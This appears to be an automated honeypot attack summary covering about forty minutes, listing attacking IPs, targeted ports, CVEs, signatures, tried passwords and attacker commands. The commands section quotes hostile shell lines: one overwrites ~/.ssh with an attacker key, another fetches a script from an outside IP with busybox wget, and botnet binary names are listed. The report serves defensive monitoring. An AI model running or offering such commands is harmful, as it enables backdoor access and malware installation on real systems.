
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-25T10:01:34Z
**Timeframe:** 2025-10-25T09:20:01Z to 2025-10-25T10:00:01Z
**Files Used:**
- agg_log_20251025T092001Z.json
- agg_log_20251025T094001Z.json
- agg_log_20251025T100001Z.json

## Executive Summary

This report summarizes 25,065 events collected from the honeypot network. The primary attack vectors observed were SMB (port 445) and VNC (port 5900). The most active attacker IP was 185.243.96.105. A variety of CVEs were targeted, and attackers attempted numerous commands, primarily focused on reconnaissance and establishing further access.

## Detailed Analysis

### Attacks by Honeypot
- Dionaea: 5236
- Honeytrap: 4994
- Suricata: 4544
- Heralding: 4418
- Cowrie: 3395
- Ciscoasa: 1833
- Sentrypeer: 334
- Mailoney: 133
- Adbhoney: 34
- ConPot: 53
- H0neytr4p: 44
- Tanner: 26
- Honeyaml: 9
- ElasticPot: 4
- Redishoneypot: 3
- Wordpot: 3
- Ipphoney: 2

### Top Attacking IPs
- 185.243.96.105: 4418
- 116.105.226.199: 2224
- 109.205.211.9: 2616
- 41.130.140.86: 2214
- 80.94.95.238: 1389
- 159.89.166.213: 628
- 193.37.69.115: 345
- 188.166.24.228: 298
- 134.209.84.154: 240
- 101.36.117.148: 238
- 14.225.167.110: 154
- 154.221.28.214: 143
- 107.170.36.5: 250
- 41.204.63.118: 154

### Top Targeted Ports/Protocols
- 445: 4971
- vnc/5900: 4418
- 22: 572
- 5060: 334
- 3306: 196
- 8333: 177
- 5903: 133
- 25: 133
- 5901: 112

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012
- CVE-2021-44228 CVE-2021-44228
- CVE-2024-12856 CVE-2024-12856 CVE-2024-12885
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-1999-0183

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- uname -a
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh...

### Signatures Triggered
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 2289
- 2023753: 2289
- ET HUNTING RDP Authentication Bypass Attempt: 733
- 2034857: 733
- ET DROP Dshield Block Listed Source group 1: 459
- 2402000: 459
- ET SCAN NMAP -sS window 1024: 183
- 2009582: 183

### Users / Login Attempts
- /Passw0rd: 16
- /1q2w3e4r: 22
- /passw0rd: 16
- /1qaz2wsx: 14
- sa/!QAZ2wsx: 10
- root/epay123: 4
- root/Ericaamor01: 4
- root/ERGPBX01: 4

### Files Uploaded/Downloaded
- wget.sh;: 12
- w.sh;: 3
- c.sh;: 3
- arm.urbotnetisass: 2
- arm5.urbotnetisass: 2
- arm6.urbotnetisass: 2
- arm7.urbotnetisass: 2
- x86_32.urbotnetisass: 2
- mips.urbotnetisass: 2
- mipsel.urbotnetisass: 2

### HTTP User-Agents
- N/A

### SSH Clients
- N/A

### SSH Servers
- N/A

### Top Attacker AS Organizations
- N/A

## Key Observations and Anomalies

- A significant amount of scanning activity for MS Terminal Server on non-standard ports was observed.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` was frequently used, indicating attempts to install persistent SSH keys for backdoor access.
- The attacker at `213.209.143.62` and `94.154.35.154` was observed attempting to download and execute multiple malicious scripts.
- The CVEs `CVE-2002-0013` and `CVE-2002-0012` were the most frequently targeted vulnerabilities.
